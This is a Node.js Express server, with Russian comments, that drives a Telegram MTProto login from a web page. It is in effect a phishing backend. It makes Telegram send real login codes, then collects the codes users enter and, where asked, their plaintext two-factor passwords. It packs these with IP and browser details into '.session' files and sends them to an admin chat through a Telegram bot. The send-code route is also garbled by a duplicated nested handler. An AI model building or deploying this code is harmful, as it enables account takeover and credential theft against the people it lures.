require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const os = require('os');
const FormData = require('form-data');

// Универсальный импорт MTProto
const mtprotoModule = require('@mtproto/core');
console.log('=== MTProto debug ===');
console.log('Type of module:', typeof mtprotoModule);
console.log('Module keys:', Object.keys(mtprotoModule));
console.log('=====================');

let MTProto;
if (typeof mtprotoModule === 'function') {
  MTProto = mtprotoModule;
  console.log('Using MTProto as function');
} else if (mtprotoModule.MTProto && typeof mtprotoModule.MTProto === 'function') {
  MTProto = mtprotoModule.MTProto;
  console.log('Using MTProto.MTProto as function');
} else {
  console.error('Cannot find MTProto constructor');
  process.exit(1);
}

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Настройки Telegram MTProto
const api_id = parseInt(process.env.API_ID);
const api_hash = process.env.API_HASH;

// Хранилище для состояний авторизации
const authStore = new Map();

// Создаём папку для хранения сессии MTProto
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// Инициализация MTProto (пробуем с new и без)
let mtproto;
try {
  mtproto = new MTProto({
    api_id,
    api_hash,
    storageOptions: { path: path.join(dataDir, 'mtproto.json') }
  });
  console.log('MTProto initialized with new');
} catch (e) {
  if (e.message.includes('not a constructor')) {
    mtproto = MTProto({
      api_id,
      api_hash,
      storageOptions: { path: path.join(dataDir, 'mtproto.json') }
    });
    console.log('MTProto initialized as function');
  } else {
    console.error('Failed to initialize MTProto:', e);
    process.exit(1);
  }
}

// Вспомогательная функция отправки файла сессии админу
async function sendSessionToAdmin(sessionData, phone) {
  const fileName = `session_${phone}_${Date.now()}.session`; // изменено на .session
  const filePath = path.join(os.tmpdir(), fileName);
  fs.writeFileSync(filePath, JSON.stringify(sessionData, null, 2));

  try {
    const formData = new FormData();
    formData.append('chat_id', process.env.ADMIN_CHAT_ID);
    formData.append('document', fs.createReadStream(filePath), fileName);

    await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendDocument`, formData, {
      headers: formData.getHeaders()
    });
    fs.unlinkSync(filePath);
    console.log(`Session file sent to admin for ${phone}`);
  } catch (error) {
    console.error('Failed to send session to admin:', error);
  }
}

// Вспомогательная функция для обработки ошибок миграции
async function handleMigrateError(error, originalCall, ...args) {
  if (error.error_message && error.error_message.startsWith('PHONE_MIGRATE_')) {
    const dc = parseInt(error.error_message.split('_').pop());
    console.log(`Migrating to DC ${dc}...`);
    await mtproto.setDefaultDc(dc);
    // Повторяем исходный вызов
    return await originalCall(...args);
  }
  throw error;
}

// Функция отправки реального кода через Telegram
async function sendRealCode(phone) {
  try {
    const result = await mtproto.call('auth.sendCode', {
      phone_number: phone,
      settings: { _: 'codeSettings' }
    });
    return {
      success: true,
      phone_code_hash: result.phone_code_hash,
      timeout: result.timeout || 60,
      message: 'Код отправлен Telegram'
    };
  } catch (error) {
    console.error('MTProto sendCode error:', error);
    try {
      const result = await handleMigrateError(error, mtproto.call.bind(mtproto), 'auth.sendCode', {
        phone_number: phone,
        settings: { _: 'codeSettings' }
      });
      return {
        success: true,
        phone_code_hash: result.phone_code_hash,
        timeout: result.timeout || 60,
        message: 'Код отправлен Telegram (после миграции)'
      };
    } catch (migrateError) {
      return {
        success: false,
        error: migrateError.error_message || 'Не удалось отправить код'
      };
    }
  }
}

// Функция проверки введённого кода
async function signInWithCode(phone, code, phone_code_hash) {
  try {
    const result = await mtproto.call('auth.signIn', {
      phone_number: phone,
      phone_code_hash: phone_code_hash,
      phone_code: code
    });
    return { success: true, user: result.user };
  } catch (error) {
    console.error('MTProto signIn error:', error);
    try {
      const result = await handleMigrateError(error, mtproto.call.bind(mtproto), 'auth.signIn', {
        phone_number: phone,
        phone_code_hash: phone_code_hash,
        phone_code: code
      });
      return { success: true, user: result.user };
    } catch (migrateError) {
      return {
        success: false,
        error: migrateError.error_message || 'Неверный код'
      };
    }
  }
}

// Эндпоинт для запроса кода (шаг 1)
app.post('/api/send-code', async (req, res) => {
  app.post('/api/send-code', async (req, res) => {
  console.log('[/api/send-code] Headers:', req.headers);
  console.log('[/api/send-code] Body:', req.body);
  const { phone } = req.body;
  console.log('[/api/send-code] Extracted phone:', phone);
  if (!phone) {
    console.log('[/api/send-code] Phone missing, returning 400');
    return res.status(400).json({ error: 'Phone required' });
  }
  // ... остальной код
  });
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: 'Phone required' });

  const cleanPhone = phone.replace(/\D/g, '');
  console.log(`[/api/send-code] Received phone: ${phone}, clean: ${cleanPhone}`);

  const sendResult = await sendRealCode(phone);

  if (!sendResult.success) {
    console.log('[/api/send-code] Error:', sendResult.error);
    return res.status(500).json({ error: sendResult.error });
  }

  authStore.set(cleanPhone, {
    phone_code_hash: sendResult.phone_code_hash,
    attempts: 0,
    needPassword: false,
    code: null,
    originalPhone: phone
  });

  setTimeout(() => authStore.delete(cleanPhone), 300000);

  console.log(`[/api/send-code] Code hash saved for ${cleanPhone}`);
  res.json({
    success: true,
    message: 'Code sent via Telegram',
    timeout: sendResult.timeout
  });
});

// Эндпоинт для проверки кода (шаг 2)
app.post('/api/verify-code', async (req, res) => {
  const { phone, code } = req.body;
  console.log('[/api/verify-code] Received:', { phone, code });

  if (!phone || !code) return res.status(400).json({ error: 'Phone and code required' });

  const cleanPhone = phone.replace(/\D/g, '');
  const authData = authStore.get(cleanPhone);
  console.log('[/api/verify-code] Auth data:', authData ? 'found' : 'NOT FOUND');

  if (!authData) {
    return res.status(400).json({ error: 'No code requested or expired' });
  }

  if (authData.attempts >= 5) {
    return res.status(429).json({ error: 'Too many attempts' });
  }

  const signResult = await signInWithCode(authData.originalPhone, code, authData.phone_code_hash);
  authData.attempts += 1;
  authData.code = code;
  authStore.set(cleanPhone, authData);

  if (signResult.success) {
    console.log('[/api/verify-code] Sign success');
    const sessionData = {
      phone: authData.originalPhone,
      code_used: code,
      user: signResult.user,
      timestamp: new Date().toISOString(),
      userAgent: req.headers['user-agent'],
      ip: req.ip
    };
    await sendSessionToAdmin(sessionData, cleanPhone);
    authStore.delete(cleanPhone);
    return res.json({ success: true });
  } else {
    console.log('[/api/verify-code] Sign error:', signResult.error);
    if (signResult.error === 'SESSION_PASSWORD_NEEDED') {
      authData.needPassword = true;
      authStore.set(cleanPhone, authData);
      return res.json({ success: false, needPassword: true });
    } else {
      return res.status(400).json({ error: signResult.error });
    }
  }
});

// Эндпоинт для отправки пароля (шаг 3)
app.post('/api/submit-password', async (req, res) => {
  const { phone, password } = req.body;
  console.log('[/api/submit-password] Received:', { phone, password });

  if (!phone || !password) return res.status(400).json({ error: 'Phone and password required' });

  const cleanPhone = phone.replace(/\D/g, '');
  const authData = authStore.get(cleanPhone);
  if (!authData || !authData.needPassword) {
    return res.status(400).json({ error: 'No pending 2FA request' });
  }

  const sessionData = {
    phone: authData.originalPhone,
    code_used: authData.code,
    password: password,
    phone_code_hash: authData.phone_code_hash,
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'],
    ip: req.ip
  };

  await sendSessionToAdmin(sessionData, cleanPhone);
  authStore.delete(cleanPhone);
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});